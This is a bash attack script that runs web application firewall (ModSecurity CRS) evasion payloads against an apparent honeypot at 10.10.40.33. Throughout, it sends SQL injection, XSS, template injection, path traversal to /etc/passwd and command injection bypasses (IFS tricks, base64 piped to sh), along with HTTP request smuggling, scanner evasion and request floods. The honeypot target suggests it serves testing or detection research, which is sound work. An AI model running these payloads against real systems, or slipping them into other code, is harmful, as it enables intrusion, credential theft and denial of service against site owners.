#!/bin/bash
###############################################################################
# WAF Evasion Attack Script
# ModSecurity CRS bypass testing against honeypot at 10.10.40.33:8080
# Subtypes: sqli_bypass, xss_bypass, path_bypass, rce_bypass, protocol_abuse,
#           scanner_evasion, rate_flood, fingerprint, full
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.33}"
TARGET_PORT="${3:-8080}"
RESULTS_DIR="${4:-.}"

BASE_URL="http://${TARGET_IP}:${TARGET_PORT}"

mkdir -p "$RESULTS_DIR"

echo "[*] WAF evasion attacks: $SUBTYPE against ${TARGET_IP}:${TARGET_PORT}"

run_sqli_bypass() {
    echo "[*] SQLi WAF bypass payloads (CRS 942xxx evasion)"

    # Comment insertion bypasses
    echo "[*] Comment insertion variants..."
    local comment_payloads=(
        "1'/**/OR/**/1=1--"
        "1'/*!50000OR*/1=1--"
        "1'/**/UN/**/ION/**/SE/**/LECT/**/1,2,3--"
        "1'/*!UNION*//*!SELECT*/1,2,3--"
        "1'/**/oR/**/1=1#"
    )
    for p in "${comment_payloads[@]}"; do
        curl -sk "${BASE_URL}/?id=${p}" -o /dev/null -w "  comment: %{http_code}\n" \
            >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Case alternation
    echo "[*] Case alternation..."
    local case_payloads=(
        "1' uNiOn SeLeCt 1,2,3--"
        "1' UnIoN aLl SeLeCt 1,2,3--"
        "1' oR 1=1--"
        "1' AnD 1=1--"
    )
    for p in "${case_payloads[@]}"; do
        curl -sk "${BASE_URL}/?id=${p}" -o /dev/null -w "  case: %{http_code}\n" \
            >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Hex encoding
    echo "[*] Hex-encoded payloads..."
    local hex_payloads=(
        "1' OR 0x31=0x31--"
        "1' UNION SELECT 0x61646d696e,2,3--"
        "1' AND SUBSTR(0x414243,1,1)=0x41--"
    )
    for p in "${hex_payloads[@]}"; do
        curl -sk "${BASE_URL}/?id=${p}" -o /dev/null -w "  hex: %{http_code}\n" \
            >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Scientific notation
    echo "[*] Scientific notation..."
    local sci_payloads=(
        "1' OR 1e0=1e0--"
        "1' AND 1.e0=1.0--"
        "0e0' UNION SELECT 1,2,3--"
    )
    for p in "${sci_payloads[@]}"; do
        curl -sk "${BASE_URL}/?id=${p}" -o /dev/null -w "  sci: %{http_code}\n" \
            >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Cookie and header injection
    echo "[*] SQLi via cookies and headers..."
    curl -sk "${BASE_URL}/" -b "session=1' OR 1=1--" -o /dev/null -w "  cookie: %{http_code}\n" \
        >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/" -H "X-Forwarded-For: 1' OR 1=1--" -o /dev/null -w "  xff: %{http_code}\n" \
        >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/" -H "Referer: http://evil.com/?q=1' UNION SELECT 1--" -o /dev/null -w "  referer: %{http_code}\n" \
        >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true

    # Whitespace alternatives
    echo "[*] Whitespace alternatives..."
    local ws_payloads=(
        "1'%09OR%091=1--"
        "1'%0aOR%0a1=1--"
        "1'%0dOR%0d1=1--"
        "1'%0bOR%0b1=1--"
        "1'+OR+1=1--"
    )
    for p in "${ws_payloads[@]}"; do
        curl -sk "${BASE_URL}/?id=${p}" -o /dev/null -w "  ws: %{http_code}\n" \
            >> "${RESULTS_DIR}/sqli_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    echo "[+] SQLi bypass complete — $(wc -l < "${RESULTS_DIR}/sqli_bypass.txt" 2>/dev/null || echo 0) results"
}

run_xss_bypass() {
    echo "[*] XSS WAF bypass payloads (CRS 941xxx evasion)"

    # Event handler variations
    echo "[*] Event handler bypasses..."
    local event_payloads=(
        '<img src=x onerror="alert(1)">'
        '<img/src=x onerror=alert(1)>'
        '<svg/onload=alert(1)>'
        '<body onpageshow=alert(1)>'
        '<input onfocus=alert(1) autofocus>'
        '<marquee onstart=alert(1)>'
        '<details open ontoggle=alert(1)>'
        '<video><source onerror=alert(1)>'
    )
    for p in "${event_payloads[@]}"; do
        curl -sk "${BASE_URL}/?q=${p}" -o /dev/null -w "  event: %{http_code}\n" \
            >> "${RESULTS_DIR}/xss_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # SVG-based XSS
    echo "[*] SVG-based XSS..."
    local svg_payloads=(
        '<svg><script>alert(1)</script></svg>'
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
        '<svg><set attributeName=onmouseover value=alert(1)>'
    )
    for p in "${svg_payloads[@]}"; do
        curl -sk "${BASE_URL}/?q=${p}" -o /dev/null -w "  svg: %{http_code}\n" \
            >> "${RESULTS_DIR}/xss_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Template injection
    echo "[*] Template injection payloads..."
    local tpl_payloads=(
        '{{7*7}}'
        '${7*7}'
        '#{7*7}'
        '<%= 7*7 %>'
        '{{constructor.constructor("return this")()}}'
    )
    for p in "${tpl_payloads[@]}"; do
        curl -sk "${BASE_URL}/?q=${p}" -o /dev/null -w "  template: %{http_code}\n" \
            >> "${RESULTS_DIR}/xss_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Entity encoding
    echo "[*] HTML entity encoding..."
    local entity_payloads=(
        '&#60;script&#62;alert(1)&#60;/script&#62;'
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'
        '&lt;img src=x onerror=alert(1)&gt;'
    )
    for p in "${entity_payloads[@]}"; do
        curl -sk "${BASE_URL}/?q=${p}" -o /dev/null -w "  entity: %{http_code}\n" \
            >> "${RESULTS_DIR}/xss_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # JS protocol
    echo "[*] JavaScript protocol schemes..."
    curl -sk "${BASE_URL}/?url=javascript:alert(1)" -o /dev/null -w "  jsproto: %{http_code}\n" \
        >> "${RESULTS_DIR}/xss_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?url=data:text/html,<script>alert(1)</script>" -o /dev/null -w "  data: %{http_code}\n" \
        >> "${RESULTS_DIR}/xss_bypass.txt" 2>&1 || true

    echo "[+] XSS bypass complete — $(wc -l < "${RESULTS_DIR}/xss_bypass.txt" 2>/dev/null || echo 0) results"
}

run_path_bypass() {
    echo "[*] Path traversal WAF bypass (CRS 930xxx evasion)"

    # Double encoding
    echo "[*] Double-encoded traversal..."
    local dbl_payloads=(
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
        "%252e%252e/%252e%252e/%252e%252e/etc/passwd"
        "..%252f..%252f..%252fetc%252fpasswd"
    )
    for p in "${dbl_payloads[@]}"; do
        curl -sk "${BASE_URL}/${p}" -o /dev/null -w "  double: %{http_code}\n" \
            >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # UTF-8 overlong encoding
    echo "[*] UTF-8 overlong sequences..."
    local utf_payloads=(
        "..%c0%af..%c0%af..%c0%afetc/passwd"
        "..%c1%9c..%c1%9c..%c1%9cetc/passwd"
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    )
    for p in "${utf_payloads[@]}"; do
        curl -sk "${BASE_URL}/${p}" -o /dev/null -w "  utf8: %{http_code}\n" \
            >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Null byte
    echo "[*] Null byte injection..."
    curl -sk "${BASE_URL}/..%00/..%00/etc/passwd" -o /dev/null -w "  null1: %{http_code}\n" \
        >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?file=../../../etc/passwd%00.jpg" -o /dev/null -w "  null2: %{http_code}\n" \
        >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?file=....//....//....//etc/passwd%00" -o /dev/null -w "  null3: %{http_code}\n" \
        >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true

    # NTFS streams
    echo "[*] NTFS alternate data streams..."
    curl -sk "${BASE_URL}/?file=../../../etc/passwd::$DATA" -o /dev/null -w "  ntfs1: %{http_code}\n" \
        >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?file=web.config::$DATA" -o /dev/null -w "  ntfs2: %{http_code}\n" \
        >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true

    # Path normalization tricks
    echo "[*] Path normalization..."
    local norm_payloads=(
        "....//....//....//etc/passwd"
        "..;/..;/..;/etc/passwd"
        "..%5c..%5c..%5cetc/passwd"
        "..\\..\\..\\/etc/passwd"
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    )
    for p in "${norm_payloads[@]}"; do
        curl -sk "${BASE_URL}/${p}" -o /dev/null -w "  norm: %{http_code}\n" \
            >> "${RESULTS_DIR}/path_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    echo "[+] Path traversal bypass complete"
}

run_rce_bypass() {
    echo "[*] RCE/Command injection bypass (CRS 932xxx evasion)"

    # $IFS substitution
    echo "[*] IFS-based bypasses..."
    local ifs_payloads=(
        ';cat${IFS}/etc/passwd'
        ';cat$IFS/etc/passwd'
        '|cat${IFS}/etc/passwd'
        ';{cat,/etc/passwd}'
        ';cat</etc/passwd'
    )
    for p in "${ifs_payloads[@]}"; do
        curl -sk "${BASE_URL}/?cmd=${p}" -o /dev/null -w "  ifs: %{http_code}\n" \
            >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Tick/backtick substitution
    echo "[*] Backtick and subshell..."
    local tick_payloads=(
        '`id`'
        '$(id)'
        '|(id)'
        ';$(whoami)'
        '`whoami`'
    )
    for p in "${tick_payloads[@]}"; do
        curl -sk "${BASE_URL}/?cmd=${p}" -o /dev/null -w "  tick: %{http_code}\n" \
            >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Base64 pipeline
    echo "[*] Base64 encoded commands..."
    local b64_cmd
    b64_cmd=$(echo -n "id" | base64)
    curl -sk "${BASE_URL}/?cmd=;echo${IFS}${b64_cmd}|base64${IFS}-d|sh" -o /dev/null -w "  b64: %{http_code}\n" \
        >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true
    b64_cmd=$(echo -n "cat /etc/passwd" | base64)
    curl -sk "${BASE_URL}/?cmd=;echo${IFS}${b64_cmd}|base64${IFS}-d|bash" -o /dev/null -w "  b64_2: %{http_code}\n" \
        >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true

    # Variable expansion
    echo "[*] Variable expansion tricks..."
    local var_payloads=(
        ';w"h"oam"i"'
        ';/???/??t /???/p??s??'
        ';c\at /e\tc/pa\sswd'
        ";c'a't /e't'c/pa's'swd"
    )
    for p in "${var_payloads[@]}"; do
        curl -sk "${BASE_URL}/?cmd=${p}" -o /dev/null -w "  var: %{http_code}\n" \
            >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true
        sleep 0.3
    done

    # Newline injection
    echo "[*] Newline/CR injection..."
    curl -sk "${BASE_URL}/?cmd=%0aid" -o /dev/null -w "  nl: %{http_code}\n" \
        >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?cmd=%0d%0aid" -o /dev/null -w "  crlf: %{http_code}\n" \
        >> "${RESULTS_DIR}/rce_bypass.txt" 2>&1 || true

    echo "[+] RCE bypass complete"
}

run_protocol_abuse() {
    echo "[*] HTTP protocol abuse"

    # HTTP request smuggling (CL/TE)
    echo "[*] HTTP smuggling probes..."
    curl -sk "${BASE_URL}/" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 6" \
        -d $'0\r\n\r\nG' \
        -o /dev/null -w "  cl_te: %{http_code}\n" \
        >> "${RESULTS_DIR}/protocol_abuse.txt" 2>&1 || true

    curl -sk "${BASE_URL}/" \
        -H "Transfer-Encoding: chunked" \
        -H "Transfer-Encoding: identity" \
        -o /dev/null -w "  te_te: %{http_code}\n" \
        >> "${RESULTS_DIR}/protocol_abuse.txt" 2>&1 || true

    # Verb tampering
    echo "[*] HTTP verb tampering..."
    local verbs=("TRACE" "DEBUG" "PROPFIND" "TRACK" "CONNECT" "PATCH" "MKCOL" "COPY" "MOVE")
    for verb in "${verbs[@]}"; do
        curl -sk -X "$verb" "${BASE_URL}/" \
            -o /dev/null -w "  ${verb}: %{http_code}\n" \
            >> "${RESULTS_DIR}/protocol_abuse.txt" 2>&1 || true
        sleep 0.2
    done

    # Oversized headers
    echo "[*] Oversized header probes..."
    local big_header
    big_header=$(python3 -c "print('A'*8192)" 2>/dev/null || printf 'A%.0s' {1..8192})
    curl -sk "${BASE_URL}/" \
        -H "X-Custom-Header: ${big_header}" \
        -o /dev/null -w "  bigheader: %{http_code}\n" \
        >> "${RESULTS_DIR}/protocol_abuse.txt" 2>&1 || true

    # Many headers
    echo "[*] Header flooding..."
    local header_args=""
    for i in $(seq 1 50); do
        header_args="${header_args} -H 'X-Header-${i}: value${i}'"
    done
    eval curl -sk "${BASE_URL}/" $header_args \
        -o /dev/null -w "  flood: %{http_code}\n" \
        >> "${RESULTS_DIR}/protocol_abuse.txt" 2>&1 || true

    # Nmap HTTP methods check
    echo "[*] Nmap HTTP method enumeration..."
    nmap -p "$TARGET_PORT" --script=http-methods "$TARGET_IP" \
        -oN "${RESULTS_DIR}/nmap_http_methods.txt" 2>&1 || true

    echo "[+] Protocol abuse complete"
}

run_scanner_evasion() {
    echo "[*] Scanner evasion techniques"

    # Nikto with evasion modes
    if command -v nikto &>/dev/null; then
        echo "[*] Nikto evasion mode 1 (Random URI encoding)..."
        nikto -h "$TARGET_IP" -p "$TARGET_PORT" \
            -evasion 1 \
            -Format txt -output "${RESULTS_DIR}/nikto_evasion1.txt" \
            -maxtime 120 2>&1 || true

        echo "[*] Nikto evasion mode 2 (Directory self-reference)..."
        nikto -h "$TARGET_IP" -p "$TARGET_PORT" \
            -evasion 2 \
            -Format txt -output "${RESULTS_DIR}/nikto_evasion2.txt" \
            -maxtime 120 2>&1 || true
    fi

    # User-Agent rotation
    echo "[*] User-Agent rotation..."
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        "curl/7.88.1"
        ""
    )
    for ua in "${user_agents[@]}"; do
        curl -sk "${BASE_URL}/" \
            -H "User-Agent: ${ua}" \
            -o /dev/null -w "  UA[${ua:0:20}]: %{http_code}\n" \
            >> "${RESULTS_DIR}/scanner_evasion.txt" 2>&1 || true
        sleep 0.5
    done

    # HTTP parameter pollution
    echo "[*] Parameter pollution..."
    curl -sk "${BASE_URL}/?id=1&id=2%27+OR+1=1--" -o /dev/null -w "  hpp1: %{http_code}\n" \
        >> "${RESULTS_DIR}/scanner_evasion.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?id=safe&id=<script>alert(1)</script>" -o /dev/null -w "  hpp2: %{http_code}\n" \
        >> "${RESULTS_DIR}/scanner_evasion.txt" 2>&1 || true

    echo "[+] Scanner evasion complete"
}

run_rate_flood() {
    echo "[*] Rate-based attack (CRS 912xxx anomaly threshold testing)"

    # Rapid GET requests
    echo "[*] Rapid GET flood (100 requests)..."
    for i in $(seq 1 100); do
        curl -sk "${BASE_URL}/?r=${i}" -o /dev/null &
        if (( i % 20 == 0 )); then
            wait
        fi
    done
    wait
    echo "[*] GET flood complete"
    sleep 2

    # POST flood
    echo "[*] POST flood (50 requests)..."
    for i in $(seq 1 50); do
        curl -sk -X POST "${BASE_URL}/" \
            -d "username=admin&password=test${i}" \
            -o /dev/null &
        if (( i % 10 == 0 )); then
            wait
        fi
    done
    wait
    echo "[*] POST flood complete"
    sleep 2

    # Slow-rate requests (Slowloris-style headers)
    echo "[*] Slow-rate header drip (10 connections)..."
    for i in $(seq 1 10); do
        curl -sk "${BASE_URL}/" \
            -H "X-Slow: ${i}" \
            --limit-rate 100 \
            -o /dev/null &
    done
    wait

    echo "[+] Rate flood complete"
}

run_fingerprint() {
    echo "[*] WAF fingerprinting"

    # Server header probing
    echo "[*] Server header analysis..."
    curl -skI "${BASE_URL}/" > "${RESULTS_DIR}/waf_headers.txt" 2>&1 || true
    curl -skI "${BASE_URL}/nonexistent-page-404" >> "${RESULTS_DIR}/waf_headers.txt" 2>&1 || true

    # Error page analysis
    echo "[*] Error page analysis..."
    curl -sk "${BASE_URL}/?id=<script>alert(1)</script>" > "${RESULTS_DIR}/waf_blocked_page.txt" 2>&1 || true
    curl -sk "${BASE_URL}/?id=1' OR 1=1--" >> "${RESULTS_DIR}/waf_blocked_page.txt" 2>&1 || true
    curl -sk "${BASE_URL}/../../etc/passwd" >> "${RESULTS_DIR}/waf_blocked_page.txt" 2>&1 || true

    # Blocking threshold detection
    echo "[*] Threshold detection (incremental payloads)..."
    local thresholds=(
        "normal"
        "' OR"
        "' OR 1"
        "' OR 1=1"
        "' OR 1=1--"
        "' UNION SELECT"
        "' UNION SELECT 1,2,3--"
        "<script>"
        "<script>alert(1)</script>"
    )
    for t in "${thresholds[@]}"; do
        local code
        code=$(curl -sk "${BASE_URL}/?test=${t}" -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")
        echo "  payload='${t}' -> HTTP ${code}" >> "${RESULTS_DIR}/waf_thresholds.txt"
        sleep 0.5
    done

    # WAF technology detection via response patterns
    echo "[*] WAF technology detection..."
    curl -sk "${BASE_URL}/?id=<script>alert(1)</script>" -D - \
        > "${RESULTS_DIR}/waf_detect_response.txt" 2>&1 || true

    # Nmap WAF detection
    echo "[*] Nmap WAF detection scripts..."
    nmap -p "$TARGET_PORT" --script=http-waf-detect,http-waf-fingerprint "$TARGET_IP" \
        -oN "${RESULTS_DIR}/nmap_waf_detect.txt" 2>&1 || true

    echo "[+] WAF fingerprinting complete"
}

case "$SUBTYPE" in
    sqli_bypass)       run_sqli_bypass ;;
    xss_bypass)        run_xss_bypass ;;
    path_bypass)       run_path_bypass ;;
    rce_bypass)        run_rce_bypass ;;
    protocol_abuse)    run_protocol_abuse ;;
    scanner_evasion)   run_scanner_evasion ;;
    rate_flood)        run_rate_flood ;;
    fingerprint)       run_fingerprint ;;
    full)
        run_fingerprint
        sleep 5
        run_sqli_bypass
        sleep 5
        run_xss_bypass
        sleep 5
        run_path_bypass
        sleep 5
        run_rce_bypass
        sleep 5
        run_protocol_abuse
        sleep 5
        run_scanner_evasion
        sleep 5
        run_rate_flood
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: sqli_bypass, xss_bypass, path_bypass, rce_bypass, protocol_abuse, scanner_evasion, rate_flood, fingerprint, full"
        exit 1
        ;;
esac

echo "[*] WAF evasion script complete"
